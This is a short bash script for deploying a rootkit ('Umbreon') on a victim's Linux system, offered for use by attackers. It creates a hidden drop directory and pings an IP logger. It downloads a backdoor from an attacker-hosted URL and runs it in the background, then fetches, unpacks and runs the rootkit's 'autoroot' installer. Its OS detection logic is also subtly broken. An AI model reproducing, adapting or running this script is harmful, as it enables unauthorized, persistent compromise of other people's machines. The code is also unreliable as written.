# This is a call backscript to execute your rootkit
# You may have to edit this a bit to get it to work with yours, this is configured for 'Umbreon' as of now.

# -- Edit this -- #
filename="rootkit.zip" # Filename rootkit
filename2="" # Backdoor filesname + URL
url="" # Hosted website
sdir="/usr/includes/c--" # Secrete Directory
log="IPLOGGER" # Your IP Logger.

# -- Stop Editing --#

# Detect what OS victum is using
osindicater=`gcc --version`
# Creating a quick drop folder (configurable above)
mkdir -p $sdir && cd $sdir 
wget -q -O /tmp/... $log # Logs ip
# Payload #1
curl --silent http://$url/$filename2 -o .l; chmod +x .l;nohup ./.l </dev/null >/dev/null 2>&1
# Payload #2
curl --silent http://$url/$filename; tar -zxvf $filename; chmod 777 $filename
# Dect what OS victum has
if [[ $osindicater == "Red Hat" ]]; then
  cd /usr/includes/c--/$filename; chmod 777 *; ./autoroot google passwd
fi
if [[ $osindicater == "ubuntu" ]]; then
  cd /usr/includes/c--/$filename; chmod 777 *; ./autoroot google passwd
fi